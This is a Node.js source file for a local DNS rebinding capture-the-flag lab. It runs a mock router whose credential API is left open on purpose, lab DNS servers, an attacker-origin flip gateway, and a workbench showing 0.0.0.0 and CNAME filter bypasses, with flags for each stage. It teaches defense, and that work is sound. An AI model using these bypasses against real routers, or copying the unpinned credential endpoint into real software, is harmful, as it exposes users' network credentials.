/**
 * HarborHome — advanced DNS rebinding laboratory.
 *
 * Same-origin policy is hostname-based. If an attacker name first
 * resolves to the attacker, the browser loads JS. A later lookup of
 * the same name (TTL 0/1) can return a private address. The JS then
 * reads the router/IoT API as if it were still on the attacker origin.
 *
 * PayloadsAllTheThings — DNS Rebinding, protection bypasses:
 *   https://swisskyrepo.github.io/PayloadsAllTheThings/DNS%20Rebinding/#protection-bypasses
 *
 *   1. classic A flip to 127.0.0.1
 *   2. A 0.0.0.0 when 127/8 is filtered
 *   3. CNAME to an internal name (target.local)
 *   4. CNAME to localhost
 *
 * Chrome's stub resolver is not under our control, so the lab DNS
 * (UDP/TCP :5354–:5356) plus a same-origin flip gateway (:3998)
 * demonstrate the protocol and the SOP bypass without rewriting the
 * workstation resolver.
 */
const http = require('http');
const express = require('express');
const { ATTACKER_A, LOOPBACK, UNSPEC, TYPE_A, TYPE_CNAME, RebindZone, listenDns, queryUdp, fqdn } =
  require('./dns');

const HARBOR_PORT = Number(process.env.HARBOR_PORT || process.env.PORT || 3900);
const GATEWAY_PORT = Number(process.env.GATEWAY_PORT || 3998);
const WORKBENCH_PORT = Number(process.env.WORKBENCH_PORT || 3999);
const DNS_RAW_PORT = Number(process.env.DNS_RAW_PORT || 5354);
const DNS_PERIMETER_PORT = Number(process.env.DNS_PERIMETER_PORT || 5355);
const DNS_STRICT_PORT = Number(process.env.DNS_STRICT_PORT || 5356);

const FLAGS = {
  classic: 'FLAG{dnsrebind-classic}',
  zero: 'FLAG{dnsrebind-zero}',
  'cname-int': 'FLAG{dnsrebind-cname-int}',
  'cname-localhost': 'FLAG{dnsrebind-cname-localhost}',
  complete: 'FLAG{dnsrebind-complete}',
};

const zone = new RebindZone();

const RESOLVERS = {
  raw: DNS_RAW_PORT,
  perimeter: DNS_PERIMETER_PORT,
  strict: DNS_STRICT_PORT,
};

function hostName(req) {
  const raw = String(req.headers.host || '');
  return fqdn(raw.split(':')[0]);
}

function flagForHost(host) {
  const name = fqdn(host);
  if (name === 'classic.rebind.lab') return { stage: 'classic', flag: FLAGS.classic };
  if (name === 'zero.rebind.lab' || name === '0.0.0.0') {
    return { stage: 'zero', flag: FLAGS.zero };
  }
  if (name === 'cname-int.rebind.lab' || name === 'target.local') {
    return { stage: 'cname-int', flag: FLAGS['cname-int'] };
  }
  if (name === 'cname-localhost.rebind.lab' || name === 'localhost') {
    return { stage: 'cname-localhost', flag: FLAGS['cname-localhost'] };
  }
  return null;
}

function css() {
  return `
    :root { color-scheme: dark; }
    body { font-family: "IBM Plex Sans", "Segoe UI", sans-serif; margin: 0; background: #0b1220; color: #e8eef7; }
    header { background: #111b2e; border-bottom: 1px solid #24324a; padding: 1rem 1.4rem; display: flex; justify-content: space-between; align-items: baseline; }
    header strong { letter-spacing: 0.04em; }
    main { max-width: 980px; margin: 0 auto; padding: 1.4rem; line-height: 1.55; }
    a { color: #7dd3fc; }
    nav a { margin-right: 0.9rem; }
    code, pre, .mono { font-family: "IBM Plex Mono", ui-monospace, monospace; font-size: 0.9em; }
    button, .btn { font: inherit; padding: 0.4rem 0.8rem; background: #2563eb; color: #fff; border: 0; border-radius: 6px; cursor: pointer; text-decoration: none; display: inline-block; margin: 0.25rem 0.35rem 0.25rem 0; }
    button.alt { background: #334155; }
    .card { background: #111b2e; border: 1px solid #24324a; border-radius: 10px; padding: 1rem 1.1rem; margin: 1rem 0; }
    .ok { border-left: 4px solid #10b981; }
    .warn { border-left: 4px solid #f59e0b; }
    .err { border-left: 4px solid #ef4444; }
    .lab { border-left: 4px solid #818cf8; }
    table { width: 100%; border-collapse: collapse; font-size: 0.92em; }
    th, td { text-align: left; padding: 0.4rem 0.5rem; border-bottom: 1px solid #24324a; vertical-align: top; }
    pre { background: #0b1220; padding: 0.75rem; overflow: auto; border-radius: 8px; }
    .flag { color: #86efac; }
    footer { color: #94a3b8; font-size: 0.85rem; margin-top: 2rem; }
  `;
}

function layout(title, body) {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>${title}</title>
  <style>${css()}</style>
</head>
<body>
  <header>
    <strong>HarborHome</strong>
    <span class="mono">router · 192.168.1.1</span>
  </header>
  <main>
    <nav>
      <a href="/">Status</a>
      <a href="/wan">WAN</a>
      <a href="/workbench">Lab workbench</a>
    </nav>
    ${body}
    <footer>
      Educational DNS rebinding lab.
      <a href="https://swisskyrepo.github.io/PayloadsAllTheThings/DNS%20Rebinding/#protection-bypasses">PayloadsAllTheThings</a>
      · WAF VIP <a href="http://127.0.0.1:8980">:8980</a>
      · Gateway <a href="http://127.0.0.1:3998">:3998</a>
      · Workbench <a href="http://127.0.0.1:3999">:3999</a>
    </footer>
  </main>
</body>
</html>`;
}

function harborApp() {
  const app = express();
  app.disable('x-powered-by');
  app.use(express.json());
  app.use(express.urlencoded({ extended: false }));

  app.get('/health', (_req, res) => {
    res.json({ ok: true, lab: 'dns-rebinding', role: 'harborhome', port: HARBOR_PORT });
  });

  app.get('/', (req, res) => {
    const hit = flagForHost(hostName(req));
    res.send(
      layout(
        'HarborHome — status',
        `
        <h1>Gateway status</h1>
        <p>This panel is bound to the LAN. There is no CSRF token and no
        <code>Host</code> pin — the browser same-origin policy is the only
        gate. That is why DNS rebinding works: after the name flips to
        loopback, script from the attacker hostname can read this API.</p>
        <div class="card lab">
          Host header: <code>${hostName(req)}</code>
          ${hit ? `<p class="flag">${hit.flag}</p>` : '<p>No rebind Host — WAN secrets stay hidden.</p>'}
        </div>
        <p><a class="btn" href="/wan">WAN configuration</a></p>
        `
      )
    );
  });

  app.get('/wan', (req, res) => {
    const hit = flagForHost(hostName(req));
    res.send(
      layout(
        'HarborHome — WAN',
        `
        <h1>WAN configuration</h1>
        <p>PPPoE credentials and the management token are served to any
        Host that reaches this process. A rebind fetch of
        <code>/api/wan-config</code> is enough.</p>
        <div class="card ${hit ? 'ok' : 'warn'}">
          ${hit ? `<p class="flag">${hit.flag}</p>` : '<p>Open this page through a rebind Host to reveal the stage flag.</p>'}
        </div>
        `
      )
    );
  });

  app.get('/api/wan-config', (req, res) => {
    const host = hostName(req);
    const hit = flagForHost(host);
    res.json({
      ok: true,
      host,
      pppoeUser: 'harbor-fiber',
      pppoePass: hit ? 's3a-c4ble-t0ken' : '********',
      mgmtToken: hit ? 'hh-mgmt-7f3a' : null,
      stage: hit ? hit.stage : null,
      flag: hit ? hit.flag : null,
    });
  });

  app.get('/api/trophy', (req, res) => {
    const stages = String(req.query.stages || '')
      .split(',')
      .map((s) => s.trim())
      .filter(Boolean);
    const need = ['classic', 'zero', 'cname-int', 'cname-localhost'];
    const complete = need.every((s) => stages.includes(s));
    res.json({
      ok: complete,
      need,
      got: stages,
      flag: complete ? FLAGS.complete : null,
    });
  });

  app.get('/workbench', (_req, res) => {
    res.redirect(`http://127.0.0.1:${WORKBENCH_PORT}/`);
  });

  return app;
}

function attackerPage() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>rebind.lab — attacker origin</title>
  <style>${css()}</style>
</head>
<body>
  <header><strong>rebind.lab</strong><span>first A = ${ATTACKER_A}</span></header>
  <main>
    <h1>Same-origin flip gateway</h1>
    <p>This port is the attacker page the browser would load after the
    first lookup. <code>POST /flip</code> simulates the TTL expiry:
    later same-origin requests are proxied to HarborHome
    (<code>:${HARBOR_PORT}</code>) with <code>Host: classic.rebind.lab</code>.</p>
    <div class="card lab">
      <button id="flip">Flip DNS (TTL expired)</button>
      <button id="steal" class="alt">fetch /api/wan-config</button>
      <pre id="out">waiting…</pre>
    </div>
    <p><a href="http://127.0.0.1:${WORKBENCH_PORT}/">Workbench</a></p>
  </main>
  <script>
    const out = document.getElementById('out');
    document.getElementById('flip').onclick = async () => {
      const r = await fetch('/flip', { method: 'POST' });
      out.textContent = await r.text();
    };
    document.getElementById('steal').onclick = async () => {
      const r = await fetch('/api/wan-config', { credentials: 'include' });
      out.textContent = await r.text();
    };
  </script>
</body>
</html>`;
}

function gatewayApp() {
  const app = express();
  app.disable('x-powered-by');
  app.use(express.json());
  let flipped = false;
  let flipHost = 'classic.rebind.lab';

  app.get('/health', (_req, res) => {
    res.json({ ok: true, lab: 'dns-rebinding', role: 'gateway', flipped, flipHost });
  });

  app.post('/flip', (req, res) => {
    flipped = true;
    if (req.body && req.body.host) flipHost = String(req.body.host);
    res.json({ flipped: true, flipHost, message: 'subsequent same-origin fetches proxy to HarborHome' });
  });

  app.post('/unflip', (_req, res) => {
    flipped = false;
    res.json({ flipped: false });
  });

  app.use((req, res) => {
    if (!flipped) {
      res.send(attackerPage());
      return;
    }
    const headers = { ...req.headers, host: flipHost };
    delete headers.connection;
    delete headers['keep-alive'];
    delete headers['proxy-connection'];
    delete headers['transfer-encoding'];
    headers.connection = 'close';
    const up = http.request(
      {
        host: '127.0.0.1',
        port: HARBOR_PORT,
        method: req.method,
        path: req.url,
        headers,
        agent: false,
      },
      (upRes) => {
        const out = { ...upRes.headers, connection: 'close' };
        delete out['transfer-encoding'];
        res.writeHead(upRes.statusCode || 502, out);
        upRes.pipe(res);
      }
    );
    up.on('error', (err) => {
      if (!res.headersSent) res.status(502).json({ error: err.message });
    });
    req.pipe(up);
  });

  return app;
}

function workbenchPage() {
  return `<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>DNS rebinding workbench</title>
  <style>${css()}</style>
</head>
<body>
  <header>
    <strong>DNS rebinding workbench</strong>
    <span class="mono">lab resolvers :5354 :5355 :5356</span>
  </header>
  <main>
    <h1>PayloadsAllTheThings protection bypasses</h1>
    <p>Perimeter DNS filters drop RFC1918 and often <code>127.0.0.0/8</code>.
    They usually still pass <code>0.0.0.0</code> and CNAME records.
    The internal stub then resolves the CNAME to loopback.</p>
    <div class="card lab">
      <p><a href="https://swisskyrepo.github.io/PayloadsAllTheThings/DNS%20Rebinding/#protection-bypasses">PAT: DNS Rebinding — protection bypasses</a></p>
      <p>Chrome will not use this lab resolver. Use the buttons (server-side
      lookup + HTTP) or the flip gateway for a real same-origin fetch.</p>
    </div>
    <table>
      <thead><tr><th>Name</th><th>After first A</th><th>Bypass</th></tr></thead>
      <tbody>
        <tr><td><code>classic.rebind.lab</code></td><td>A ${LOOPBACK}</td><td>none — blocked by 127/8 filters</td></tr>
        <tr><td><code>zero.rebind.lab</code></td><td>A ${UNSPEC}</td><td>0.0.0.0 when loopback is filtered</td></tr>
        <tr><td><code>cname-int.rebind.lab</code></td><td>CNAME target.local</td><td>no private A in the filtered answer</td></tr>
        <tr><td><code>cname-localhost.rebind.lab</code></td><td>CNAME localhost</td><td>CNAME to localhost</td></tr>
      </tbody>
    </table>
    <div class="card">
      <button data-run="classic">1. Classic 127.0.0.1</button>
      <button data-run="zero">2. 0.0.0.0 bypass</button>
      <button data-run="cname-int">3. CNAME internal</button>
      <button data-run="cname-localhost">4. CNAME localhost</button>
      <button id="trophy" class="alt">Collect trophy</button>
      <button id="reset" class="alt">Reset DNS hits</button>
      <p><a class="btn" href="http://127.0.0.1:${GATEWAY_PORT}/">Open flip gateway</a>
      <a class="btn alt" href="http://127.0.0.1:8980/">WAF VIP</a></p>
      <pre id="out">Click a stage. Each name's first lookup is ${ATTACKER_A}; the second is the rebind.</pre>
    </div>
  </main>
  <script>
    const out = document.getElementById('out');
    const got = new Set();
    async function post(url, body) {
      const r = await fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(body || {}),
      });
      return r.json();
    }
    document.getElementById('reset').onclick = async () => {
      out.textContent = JSON.stringify(await post('/api/dns-reset'), null, 2);
    };
    document.querySelectorAll('[data-run]').forEach((btn) => {
      btn.onclick = async () => {
        const stage = btn.getAttribute('data-run');
        const resolver = stage === 'classic' ? 'raw' : 'perimeter';
        await post('/api/dns-reset');
        const result = await post('/api/rebind-http', { stage, resolver });
        if (result.flag) got.add(stage);
        out.textContent = JSON.stringify(result, null, 2);
      };
    });
    document.getElementById('trophy').onclick = async () => {
      const r = await fetch('/api/trophy?stages=' + encodeURIComponent([...got].join(',')));
      out.textContent = JSON.stringify(await r.json(), null, 2);
    };
  </script>
</body>
</html>`;
}

async function lookupName(resolver, name, type = TYPE_A) {
  const port = RESOLVERS[resolver];
  if (!port) throw new Error(`unknown resolver ${resolver}`);
  return queryUdp(port, name, type);
}

async function followToConnect(resolver, name) {
  const trace = [];
  await lookupName(resolver, name, TYPE_A);
  const second = await lookupName(resolver, name, TYPE_A);
  trace.push({ step: 'second-lookup', resolver, name, answers: second.answers });

  const a = second.answers.find((rr) => rr.type === TYPE_A && rr.ip);
  if (a) return { ip: a.ip, host: name, trace };

  const cn = second.answers.find((rr) => rr.type === TYPE_CNAME && rr.cname);
  if (cn) {
    const inner = await lookupName('raw', cn.cname, TYPE_A);
    trace.push({ step: 'internal-follow', resolver: 'raw', name: cn.cname, answers: inner.answers });
    const innerA = inner.answers.find((rr) => rr.type === TYPE_A && rr.ip);
    if (innerA) return { ip: innerA.ip, host: name, cname: cn.cname, trace };
    return { ip: null, host: name, cname: cn.cname, trace, error: 'CNAME target has no A' };
  }

  return { ip: null, host: name, trace, error: 'filtered or empty answer' };
}

function httpGet(ip, port, host, path) {
  return new Promise((resolve) => {
    const req = http.request(
      {
        host: ip,
        port,
        path,
        method: 'GET',
        headers: { Host: host, Connection: 'close' },
        agent: false,
      },
      (res) => {
        const chunks = [];
        res.on('data', (c) => chunks.push(c));
        res.on('end', () => {
          const body = Buffer.concat(chunks).toString('utf8');
          let json = null;
          try {
            json = JSON.parse(body);
          } catch {
            json = null;
          }
          resolve({ status: res.statusCode, body, json });
        });
      }
    );
    req.on('error', (err) => resolve({ status: 0, error: err.message, body: '' }));
    req.setTimeout(5000, () => req.destroy(new Error('timeout')));
    req.end();
  });
}

const STAGE_NAMES = {
  classic: 'classic.rebind.lab',
  zero: 'zero.rebind.lab',
  'cname-int': 'cname-int.rebind.lab',
  'cname-localhost': 'cname-localhost.rebind.lab',
};

function workbenchApp() {
  const app = express();
  app.disable('x-powered-by');
  app.use(express.json());

  app.get('/health', (_req, res) => {
    res.json({ ok: true, lab: 'dns-rebinding', role: 'workbench', zone: zone.snapshot() });
  });

  app.get('/', (_req, res) => res.send(workbenchPage()));
  app.get('/workbench', (_req, res) => res.send(workbenchPage()));

  app.post('/api/dns-reset', (_req, res) => {
    zone.reset();
    res.json({ ok: true, zone: zone.snapshot() });
  });

  app.get('/api/dns-lookup', async (req, res) => {
    try {
      const resolver = String(req.query.resolver || 'raw');
      const name = String(req.query.name || 'classic.rebind.lab');
      const type = Number(req.query.type || TYPE_A);
      const result = await lookupName(resolver, name, type);
      res.json({ ok: true, resolver, result });
    } catch (err) {
      res.status(400).json({ ok: false, error: err.message });
    }
  });

  app.post('/api/rebind-http', async (req, res) => {
    try {
      const stage = String(req.body.stage || 'classic');
      const name = STAGE_NAMES[stage] || String(req.body.name || 'classic.rebind.lab');
      const resolver = String(req.body.resolver || (stage === 'classic' ? 'raw' : 'perimeter'));
      const followed = await followToConnect(resolver, name);
      if (!followed.ip) {
        res.json({ ok: false, stage, name, resolver, ...followed });
        return;
      }
      const httpRes = await httpGet(followed.ip, HARBOR_PORT, name, '/api/wan-config');
      res.json({
        ok: Boolean(httpRes.json && httpRes.json.flag),
        stage,
        name,
        resolver,
        connect: `${followed.ip}:${HARBOR_PORT}`,
        host: name,
        cname: followed.cname || null,
        trace: followed.trace,
        http: httpRes.json || { status: httpRes.status, error: httpRes.error, body: httpRes.body.slice(0, 400) },
        flag: httpRes.json && httpRes.json.flag,
      });
    } catch (err) {
      res.status(400).json({ ok: false, error: err.message });
    }
  });

  app.get('/api/trophy', (req, res) => {
    const stages = String(req.query.stages || '')
      .split(',')
      .map((s) => s.trim())
      .filter(Boolean);
    const need = ['classic', 'zero', 'cname-int', 'cname-localhost'];
    const complete = need.every((s) => stages.includes(s));
    res.json({ ok: complete, need, got: stages, flag: complete ? FLAGS.complete : null });
  });

  return app;
}

async function main() {
  await listenDns({ port: DNS_RAW_PORT, zone, mode: 'raw' });
  await listenDns({ port: DNS_PERIMETER_PORT, zone, mode: 'perimeter' });
  await listenDns({ port: DNS_STRICT_PORT, zone, mode: 'strict' });

  await new Promise((resolve, reject) => {
    const s = harborApp().listen(HARBOR_PORT, '0.0.0.0', resolve);
    s.on('error', reject);
  });
  await new Promise((resolve, reject) => {
    const s = gatewayApp().listen(GATEWAY_PORT, '0.0.0.0', resolve);
    s.on('error', reject);
  });
  await new Promise((resolve, reject) => {
    const s = workbenchApp().listen(WORKBENCH_PORT, '0.0.0.0', resolve);
    s.on('error', reject);
  });

  console.log(`[harborhome] :${HARBOR_PORT}  gateway :${GATEWAY_PORT}  workbench :${WORKBENCH_PORT}`);
  console.log(`[dns] raw :${DNS_RAW_PORT}  perimeter :${DNS_PERIMETER_PORT}  strict :${DNS_STRICT_PORT}`);
}

if (require.main === module) {
  main().catch((err) => {
    console.error(err);
    process.exit(1);
  });
}

module.exports = { FLAGS, STAGE_NAMES, flagForHost, followToConnect, zone };
